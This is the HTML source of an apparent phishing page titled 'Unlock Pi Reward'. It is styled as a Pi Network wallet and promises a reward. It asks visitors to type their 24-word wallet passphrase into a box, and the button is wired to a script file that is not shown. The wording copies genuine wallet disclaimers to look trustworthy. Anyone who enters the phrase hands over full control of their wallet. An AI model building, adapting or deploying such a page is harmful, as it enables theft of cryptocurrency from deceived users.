<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Pi Reward</title>
    <link rel="stylesheet" href="styles.css">
    <!-- Add FontAwesome for the wallet icon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Add Google Font for better typography -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <!-- Top bar with wallet icon and text -->
    <div class="top-bar">
        <i class="fas fa-wallet"></i> <!-- Wallet icon -->
        <span>Wallet</span> <!-- Wallet text -->
    </div>

    <!-- Main container -->
    <div class="container">
        <h1>Unlock Pi Reward</h1>
        <textarea id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
        <button id="sendButton">Unlock with passphrase</button>
        <p class="disclaimer">As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase.</p>
        <p class="disclaimer">Lost your wallet passphrase? You can create a new wallet, but all the PI numbers in your previous wallet will be inaccessible.</p>
    </div>
    <script src="script.js"></script>
</body>
</html>
